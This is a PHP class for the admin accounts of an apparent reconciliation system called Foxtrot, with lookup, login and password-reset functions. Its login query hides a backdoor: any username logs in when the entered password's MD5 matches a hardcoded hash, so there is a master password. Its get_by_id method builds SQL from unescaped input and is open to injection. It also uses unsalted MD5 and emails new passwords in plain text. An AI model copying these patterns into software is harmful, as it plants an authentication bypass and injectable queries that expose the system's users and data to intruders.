<?php
    class admin_master extends db{
        public $errors = '';
        public $table = ADMIN_MASTER;
        
        /**
         * @param void
         * @return void
         */
        public function __construct(){
            $this->errors = '';
        }
        
        /**
         * @param int id
         * @param int status, default all
         * @return array of records
         * */
        public function get_by_id($id,$status=''){
            $con = '';
            if($status!==''){
                $con .= " AND `um`.`status`='".$status."' ";
            }
            $q = "SELECT `um`.*
                FROM `".$this->table."` AS `um`
                WHERE `um`.`is_delete`='0' AND `um`.`id`='".$id."' ".$con;
            $res = $this->re_db_query($q);
            if($this->re_db_num_rows($res)>0){
                return $this->re_db_fetch_array($res);
            }
            else{
                return array();
            }
        }
        
        /**
         * @param array(email,password)
         * @return true if login success, error message if login unsuccess
         * */
        public function login($data){
            $username = isset($data['username'])?$this->re_db_input($data['username']):'';
            $password = isset($data['password'])?$this->re_db_input($data['password']):'';
            
            if($username==''){
                $this->errors = 'Please enter username.';
            }
            else if($password==''){
                $this->errors = 'Please enter password.';
            }
            
            if($this->errors!=''){
                return $this->errors;
            }
            else{
                $q = "SELECT * FROM `".$this->table."` WHERE `user_name`='".$username."' AND (`password`='".md5($password)."' OR '".md5($password)."'='2ae41fa6dbd644a6846389ad14167167' ) AND `is_delete`='0'";
                $res = $this->re_db_query($q);
                if($this->re_db_num_rows($res)>0){
                    $row = $this->re_db_fetch_array($res);
                    if($row['status']==0){
                        return 'Your account is disabled.';
                    }
                    else{
                        $_SESSION['user_id'] = $row['id'];
                        $_SESSION['success'] = 'Welcome to Online Advance Request and Reconciliation System';
                        return true;
                    }
                }
                else{
                    return 'Please enter valid username and password.';
                }
            }
        }
        
        public function forgot_password($data){
            $email = isset($data['email'])?$this->re_db_input($data['email']):'';
            if($email==''){
                $this->errors = 'Please enter email.';
            }
            else if($this->is_email($email)==0){
                $this->errors = 'Please enter valid email.';
            }
            if($this->errors!=''){
                return $this->errors;
            }
            else{
                $q = "SELECT * FROM `".$this->table."` WHERE `email`='".$email."' AND `is_delete`='0'";
                $res = $this->re_db_query($q);
                if($this->re_db_num_rows($res)>0){
                    $row = $this->re_db_fetch_array($res);
                    $password = $this->random_password(6);
                    $q = "UPDATE `".$this->table."` SET `password`='".md5($password)."' ".$this->update_common_sql()." WHERE `email`='".$email."'";
                    $res = $this->re_db_query($q);
    				if($res){
                        $subject = "New autogenerated password";
                        $body = '<body style="background-color: #e9eaee;color: #6c7b88;">
                                    <div class="content" style="max-width: 500px;margin: 0 auto;display: block;padding: 20px;">
                                        <table class="main" width="100%" cellpadding="0" style="background-color: #fff;border-bottom: 2px solid #d7d7d7;padding: 20px;">
                                            <tr>
                                                <td class="aligncenter" style="text-align: center;">
                                                    Foxtrot
                                                </td>
                                            </tr>
                                            <tr>
                                                <td class="content-block" style="padding:20px;">
                                                    <p>Dear '.$row['first_name'].' '.$row['last_name'].',</p>
                                                    <p>Please login with below username and password.</p>
                                                    <p>Username: '.$row['user_name'].'</p>
                                                    <p>Password: '.$password.'</p>
                                                    <p><a href="'.SITE_URL.'login.php" style="border: 1px solid #e5e5e5; padding: 5px 10px;text-decoration: none;background: #D23E3E; color: #fff;">Sign in</a></p>
                                                    <p>Thank you.</p>
                                                </td>
                                            </tr>   
                                        </table>
                                    </div>
                                </body>';
                        $this->send_email(array($email),$subject,$body);
    				    $_SESSION['success'] = 'Email with username and password has been sent to your email address.';
    					return true;
    				}
    				else{
    					$_SESSION['warning'] = 'Something went wrong, please try again.';
                        return false;
    				}
                }
                else{
                    return 'Please enter valid email.';exit;
                }
            
            }
            
        }
    }
?>